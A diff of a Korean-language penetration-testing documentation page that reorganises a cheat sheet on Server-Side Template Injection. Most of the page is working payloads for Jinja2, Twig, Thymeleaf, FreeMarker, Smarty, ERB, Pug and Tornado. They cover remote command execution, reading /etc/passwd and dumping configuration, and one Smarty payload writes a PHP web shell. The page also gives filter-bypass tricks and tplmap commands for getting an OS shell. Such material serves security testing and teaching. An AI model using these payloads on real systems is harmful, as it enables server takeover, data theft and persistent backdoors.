@@ -1,189 +1,127 @@
 ---
 sidebar_position: 6
+title: Server-Side Template Injection (SSTI)
 ---
 
-# Server-Side Template Injection (SSTI)
+# Server-Side Template Injection (SSTI) 취약점 진단
 
-## 기본 개념
+## Overview
 
-템플릿 엔진이 사용자 입력을 안전하지 않게 처리할 때 발생하는 취약점입니다.
+**SSTI (Server-Side Template Injection)**: 웹 애플리케이션이 사용자 입력을 템플릿 엔진에 직접 결합하여 렌더링할 때, 공격자가 악의적인 템플릿 구문을 삽입하여 서버 측에서 코드를 실행하게 만드는 취약점
 
-## Fuzz String
+- **위험성**: 단순 정보 유출부터 서버 장악(RCE)까지 이어질 수 있는 고위험 취약점
+- **대표 템플릿 엔진**: Jinja2(Python), Twig(PHP), Thymeleaf(Java), FreeMarker(Java), Smarty(PHP) 등
 
-> https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti
+---
 
-```
+## 1. Reconnaissance (탐지 및 엔진 식별)
+
+### Fuzzing 문자열 주입
+입력 폼에 다양한 템플릿 엔진의 메타 문자를 주입하여 오류 발생 여부 확인
+```text
 ${{<%[%'"}}%\.
 ```
 
-## 템플릿 엔진 탐지
-
-```
-# 기본 테스트
+### 템플릿 엔진 식별 (수학 연산 테스트)
+엔진별로 문법이 다르므로, 연산 결과를 통해 사용 중인 템플릿 엔진을 특정
+```text
+# 공통 테스트
 {{7*7}}
 ${7*7}
 <%= 7*7 %>
 ${{7*7}}
 #{7*7}
 
-# 결과로 엔진 식별
-49 → 대부분의 템플릿 엔진
-7*7 → 템플릿이 아님
+# 결과 분석
+- 49 출력: 템플릿 인젝션 취약점 존재
+- 7*7 출력: 단순 문자열로 처리됨 (안전)
 ```
 
-## Jinja2 (Python/Flask)
+---
 
-### Magic Payload
+## 2. Exploitation (엔진별 페이로드)
 
-> https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
-
+### Jinja2 (Python / Flask)
 ```python
-# 모든 서브클래스 확인
-{​{ ''.__class__.__mro__[1].__subclasses__() }​}
+# 1. Config 및 내장 객체 읽기
+{{ config.items() }}
+{{ self.__dict__ }}
 
-# 특정 클래스 찾기 (예: subprocess.Popen)
-{​{ ''.__class__.__mro__[1].__subclasses__()[396] }​}
+# 2. 클래스 탐색을 통한 파일 읽기 (인덱스는 환경마다 다를 수 있음)
+{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
 
-# RCE
-{​{ ''.__class__.__mro__[1].__subclasses__()[396]('whoami', shell=True, stdout=-1).communicate() }​}
+# 3. 원격 코드 실행 (RCE - subprocess.Popen 클래스 활용)
+{{ ''.__class__.__mro__[1].__subclasses__()[396]('whoami', shell=True, stdout=-1).communicate() }}
 ```
 
-### 파일 읽기
-
-```python
-{​{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }​}
-```
-
-### Config 읽기
-
-```python
-{​{ config }​}
-{​{ config.items() }​}
-{​{ self.__dict__ }​}
-```
-
-## Twig (PHP)
-
+### Twig (PHP)
 ```php
-{{7*7}}           # 49
-{{7*'7'}}         # 7777777
-{{dump(app)}}     # 설정 정보
-{{app.request.server.all|join(',')}}  # 환경 변수
+# 환경 변수 및 설정 노출
+{{ dump(app) }}
+{{ app.request.server.all|join(',') }}
+
+# RCE (FilterCallback 덮어쓰기)
+{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("whoami") }}
 ```
 
-### RCE
-
-```php
-# Payload 1
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
-
-# Payload 2
-{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
-```
-
-## Thymeleaf (Java/Spring)
-
+### Thymeleaf / FreeMarker (Java)
 ```java
-${7*7}            # 49
+# [Thymeleaf]
 ${T(java.lang.Runtime).getRuntime().exec('calc')}
 *{T(java.lang.Runtime).getRuntime().exec('calc')}
-```
 
-## FreeMarker (Java)
-
-```java
-${7*7}            # 49
+# [FreeMarker]
 <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
 [#assign ex='freemarker.template.utility.Execute'?new()]${ ex('id')}
 ```
 
-## Smarty (PHP)
-
+### Smarty (PHP)
 ```php
 {$smarty.version}
 {php}echo `id`;{/php}
 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
 ```
 
-## Velocity (Java)
-
-```java
-#set($x='')+$x.class.forName('java.lang.Runtime').getRuntime().exec('id')
-```
-
-## ERB (Ruby)
-
+### 기타 엔진 (ERB, Pug, Tornado)
 ```ruby
-<%= 7*7 %>        # 49
+# ERB (Ruby)
 <%= system('whoami') %>
-<%= `whoami` %>
 <%= File.open('/etc/passwd').read %>
-```
 
-## Tornado (Python)
+# Pug (Node.js)
+- var x = root.process
+- x.mainModule.require('child_process').exec('whoami')
 
-```python
-{{7*7}}
+# Tornado (Python)
 {% import os %}{{os.system('whoami')}}
 ```
 
-## Django (Python)
+---
 
+## 3. Advanced Techniques
+
+### 필터링 우회 기법 (Python/Jinja2 중심)
 ```python
-{{7*7}}           # 일반적으로 실행 안됨 (안전)
-{% debug %}       # 디버그 정보
-```
-
-## Pug (Node.js)
-
-```javascript
-= 7*7             # 49
-= process.env
-- var x = root.process
-- x.mainModule.require('child_process').exec('whoami')
-```
-
-## 우회 기법
-
-### 공백 우회
-
-```python
+# 1. 공백 차단 우회
 {{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}
-```
 
-### 따옴표 우회
-
-```python
+# 2. 따옴표(') 차단 우회 (request.args 활용)
 {{request.application.__globals__.__builtins__.__import__(request.args.x).system(request.args.c)}}&x=os&c=whoami
-```
 
-### 필터 우회
-
-```python
+# 3. 특정 키워드(class, mro 등) 필터 우회
 {{'__cla'+'ss__'}}
 {{''['__cla''ss__']}}
 ```
 
-## 탐지 및 익스플로잇 도구
-
-### tplmap
-
+### 자동화 도구 (tplmap)
+SSTI 취약점 탐지 및 쉘 획득을 자동화해주는 특화 도구
 ```bash
-# 자동 탐지 및 익스플로잇
-./tplmap.py -u 'http://<RHOST>/?name=test'
+# 기본 탐지 및 익스플로잇
+./tplmap.py -u 'http://<target>/?name=test'
 
-# POST 요청
-./tplmap.py -u 'http://<RHOST>/' -d 'name=test'
+# POST 데이터 대상 스캔
+./tplmap.py -u 'http://<target>/' -d 'name=test'
 
-# 쉘 획득
-./tplmap.py -u 'http://<RHOST>/?name=test' --os-shell
+# OS Shell 획득
+./tplmap.py -u 'http://<target>/?name=test' --os-shell
 ```
-
-## 참고
-
-- SSTI는 RCE로 이어질 수 있음
-- 각 템플릿 엔진마다 페이로드가 다름
-- `{{7*7}}` 같은 기본 테스트로 탐지
-- Jinja2가 가장 흔함 (Python/Flask)
-- Sandbox 우회 필요할 수 있음
-- 파일 읽기, 설정 노출, RCE 가능
